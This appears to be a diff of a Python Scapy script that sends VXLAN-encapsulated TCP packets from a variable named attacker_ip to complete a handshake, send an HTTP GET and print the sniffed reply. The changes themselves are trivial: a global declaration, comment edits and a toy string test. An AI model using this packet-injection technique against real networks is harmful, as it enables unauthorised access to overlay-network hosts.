@@ -42,9 +42,12 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
+global full_http_response
+
 def get_http_packet(packet):
         global http_answer 
         http_answer = packet
+        #full_http_response 
         return
 
 
@@ -75,8 +78,13 @@ out_ack = send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport
 #Send the HTTP GET
 send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
 
-#Print the HTTP Reply
+#Get the HTTP Reply
 sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
+
+
+
+
+
 
 ### Print the layers of the packet
 def get_packet_layers(packet):
@@ -103,6 +111,15 @@ raw = http_answer.getlayer(Raw)
 print '\n{0[src]} Sends a response on {1[Date]} and Server {1[Server]} and Content is \r\n\r\n'.format(ip_layer.fields, http_layer.fields)
 print(raw.load)
 
+
+#test
+
+s1 = "ben"
+s2 = "cool"
+s3 = s1
+s3 += s2
+
+print(s3)
 
 
 
